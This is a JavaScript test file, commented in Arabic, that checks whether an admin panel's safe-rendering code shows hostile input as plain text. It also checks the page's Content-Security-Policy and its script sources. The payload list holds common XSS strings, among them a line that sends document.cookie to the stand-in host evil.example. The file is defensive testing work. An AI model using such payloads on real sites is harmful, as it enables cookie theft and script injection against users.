// اختبار لوحة الأدمن: **المحتوى الخبيث يجب أن يظهر نصًّا لا كودًا**.
//
// كيف يعمل بلا متصفح ولا مكتبات: نستخرج كتلة «SAFE RENDER» من `tools/key_generator.html` نفسها
// (لا نسخة ثانية منها تتباعد مع الزمن)، ثم نُنفّذها في سياق Node مع شجرة DOM مصغّرة، فنسأل الشجرة
// نفسها: هل صار وسم؟ هل وُلد عنصر؟ هل ارتبط إجراء بنصّ؟
//
// ويشمل الاختبار ما لا يظهر في الشجرة أيضًا: سياسة CSP في الترويسة، وأن سكربت Firebase وحده هو
// المسموح، وأنه لم تبقَ إسنادة `innerHTML` بنصّ مُدخَل — لأن الخطأ لا يُصلَح باختبار واحد بل بحاجز
// اختبار **وحاجز بناء** (حاجز ١٣ في `tools/ci_invariants.sh`).

import { readFileSync } from "node:fs";
import { fileURLToPath } from "node:url";
import { dirname, join } from "node:path";
import vm from "node:vm";
import assert from "node:assert/strict";

const here = dirname(fileURLToPath(import.meta.url));
const html = readFileSync(join(here, "key_generator.html"), "utf8");

// ---------------------------------------------------------------- شجرة DOM مصغّرة

class FakeElement {
  constructor(tag) {
    this.tagName = tag.toUpperCase();
    this.className = "";
    this.textContent = "";
    this.style = {};
    this.colSpan = 0;
    this.children = [];
    this.listeners = {};
    this.type = "";
  }

  appendChild(child) {
    this.children.push(child);
    return child;
  }

  replaceChildren() {
    this.children = [];
  }

  addEventListener(event, handler) {
    (this.listeners[event] ||= []).push(handler);
  }

  /** الشبيه الوحيد المهم هنا: النصّ يُهرَّب، فلا يصير وسمًا. */
  toHtml() {
    const attrs = [];
    if (this.className) attrs.push(` class="${this.className}"`);
    if (this.colSpan) attrs.push(` colspan="${this.colSpan}"`);
    const inner = escapeHtml(this.textContent) + this.children.map((child) => child.toHtml()).join("");
    return `<${this.tagName.toLowerCase()}${attrs.join("")}>${inner}</${this.tagName.toLowerCase()}>`;
  }

  /** كل أسماء الوسوم في الشجرة — يُستعمل لإثبات أنه لم يُولد وسم من نصّ. */
  tags() {
    return [this.tagName, ...this.children.flatMap((child) => child.tags())];
  }

  /** كل السمات التي يمكن أن تُنفّذ شيئًا (onerror/onclick/…) — يجب أن تبقى صفرًا. */
  dangerousAttributes() {
    const names = Object.keys(this.listeners).filter((name) => name.startsWith("on"));
    const own = this.tagName === "SCRIPT" || this.tagName === "IFRAME" ? [this.tagName] : [];
    return [...own, ...names, ...this.children.flatMap((child) => child.dangerousAttributes())];
  }
}

function escapeHtml(text) {
  return String(text)
    .replaceAll("&", "&amp;")
    .replaceAll("<", "&lt;")
    .replaceAll(">", "&gt;")
    .replaceAll('"', "&quot;");
}

const fakeDocument = {
  createElement: (tag) => new FakeElement(tag)
};

// ---------------------------------------------------------------- استخراج الكتلة المختبرة

const begin = html.indexOf("// ===== BEGIN: SAFE RENDER");
const end = html.indexOf("// ===== END: SAFE RENDER");
assert.ok(begin > 0 && end > begin, "كتلة SAFE RENDER موجودة في اللوحة");

const safeRenderSource = html.slice(begin, end);
const sandbox = { document: fakeDocument, navigator: { clipboard: { writeText() {} } }, String, RegExp };
vm.createContext(sandbox);
vm.runInContext(`${safeRenderSource}\n;globalThis.__safeText = safeText;`, sandbox);

const { el, textCell, badgeCell, actionButton, actionCell, emptyRow, rowWith, safeText } = sandbox;

// ---------------------------------------------------------------- حمولات الاختبار

const payloads = [
  "<img src=x onerror=alert(1)>",
  '<script>fetch("https://evil.example/" + document.cookie)</script>',
  "</td></tr><tr><td onclick=alert(1)>",
  '"><iframe src="javascript:alert(1)">',
  "javascript:alert(1)",
  "`${alert(1)}`",
  "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
  "&lt;img src=x onerror=alert(1)&gt;"
];

// ---------------------------------------------------------------- ١) النصّ يبقى نصًّا

for (const payload of payloads) {
  const cell = textCell(payload);
  assert.equal(cell.textContent, payload, "النصّ يُحفظ كما هو في textContent");
  assert.equal(cell.children.length, 0, "لا عنصر يُولد من نصّ الخليّة");
  assert.deepEqual(cell.tags(), ["TD"], "الخليّة وحدها، لا وسم من المحتوى");

  const html4cell = cell.toHtml();
  assert.ok(!html4cell.includes("<img"), `لا وسم صورة من المحتوى: ${html4cell}`);
  assert.ok(!html4cell.includes("<script"), "لا وسم سكربت من المحتوى");
  assert.ok(!html4cell.includes("<iframe"), "لا إطار من المحتوى");
  assert.deepEqual(cell.dangerousAttributes(), [], "لا سمة تنفيذ وُلدت من المحتوى");
}

// ---------------------------------------------------------------- ٢) الشارات والأزرار

for (const payload of payloads) {
  const badge = badgeCell(payload, "danger");
  assert.equal(badge.children.length, 1);
  assert.equal(badge.children[0].textContent, payload);
  assert.equal(badge.children[0].children.length, 0);
  assert.deepEqual(badge.dangerousAttributes(), []);

  const row = rowWith([textCell(payload), badgeCell(payload, "warn"), emptyRow(3, payload)]);
  assert.deepEqual(row.dangerousAttributes(), []);
  assert.ok(!row.toHtml().includes("<script"), "الصفّ كله لا ينتج وسومًا");
}

// الإجراء يُربط بالكود: المعرّف لا يدخل نصّ الوسم، ويصل للدالة عند اللمس
let received = null;
const hostileId = 'x" onclick="alert(1)';
const button = actionButton("توثيق", "btn btn-outline btn-sm", () => {
  received = hostileId;
});
assert.equal(button.textContent, "توثيق");
assert.equal(button.children.length, 0);
assert.equal(button.listeners.click.length, 1, "الإجراء مربوط بـaddEventListener");
assert.ok(!button.toHtml().includes("onclick"), "لا onclick في نصّ الوسم");
button.listeners.click[0]();
assert.equal(received, hostileId, "المعرّف يصل عبر الإغلاق لا عبر نصّ الوسم");

// ---------------------------------------------------------------- ٣) النصّ الآمن

assert.equal(safeText(undefined), "");
assert.equal(safeText(null), "");
assert.equal(safeText(42), "42");
assert.equal(safeText("سقية\u0000\u0007ساعتان"), "سقيةساعتان", "محارف التحكّم تُزال");
assert.equal(safeText("<b>نصّ</b>"), "<b>نصّ</b>", "الوسم يبقى نصًّا معروضًا لا يُنفَّذ");

// ---------------------------------------------------------------- ٣ب) صياغة السكربت كاملًا

// درس حقيقي: تعديل آلي أسقط قوسًا واحدًا فصار السكربت لا يُحمّل. الاختبار يشمل الصياغة، لا
// السلوك وحده، فيفشل البناء فورًا بدل أن تُكتشف اللوحة مكسورة عند الاستعمال.
const pageScript = [...html.matchAll(/<script>([\s\S]*?)<\/script>/g)].map((m) => m[1]).pop();
assert.ok(pageScript && pageScript.length > 1000, "سكربت الصفحة موجود");
try {
  new Function(pageScript);
} catch (error) {
  assert.fail(`سكربت اللوحة لا تُصاغ صحته: ${error.message}`);
}

// ---------------------------------------------------------------- ٤) ثوابت الملف نفسه

assert.ok(
  html.includes('http-equiv="Content-Security-Policy"'),
  "اللوحة تحمل سياسة أمان محتوى (CSP)"
);
assert.ok(
  html.includes("default-src 'none'"),
  "السياسة deny-by-default لا قائمة مفتوحة"
);
assert.ok(
  html.includes("object-src 'none'") && html.includes("base-uri 'none'"),
  "لا كائنات ولا تلاعب بالمسارات"
);

// لا إسنادة innerHTML/outerHTML بقيمة مُدخَلة (نصّ ثابت مسموح، والدليل: لا `$` ولا `+`)
const assignments = [...html.matchAll(/(innerHTML|outerHTML)\s*=/g)];
for (const match of assignments) {
  const lineStart = html.lastIndexOf("\n", match.index) + 1;
  const lineEnd = html.indexOf("\n", match.index);
  const line = html.slice(lineStart, lineEnd);
  assert.ok(
    !line.includes("${") && !/\+/.test(line.split("=").slice(1).join("=")),
    `إسنادة HTML من نصّ غير ثابت: ${line.trim()}`
  );
}

// سكربتات الصفحة من gstatic وحدها (مصدر واحد معروف للـSDK)
const scriptSources = [...html.matchAll(/<script[^>]*src="([^"]+)"/g)].map((m) => m[1]);
for (const src of scriptSources) {
  assert.ok(
    src.startsWith("https://www.gstatic.com/firebasejs/"),
    `سكربت من مصدر غير مصرّح: ${src}`
  );
}

console.log("✅ لوحة الأدمن: كل حمولة خبيثة تُعرض نصًّا، وCSP قائمة، ولا إسنادة HTML بنصّ مُدخَل.");
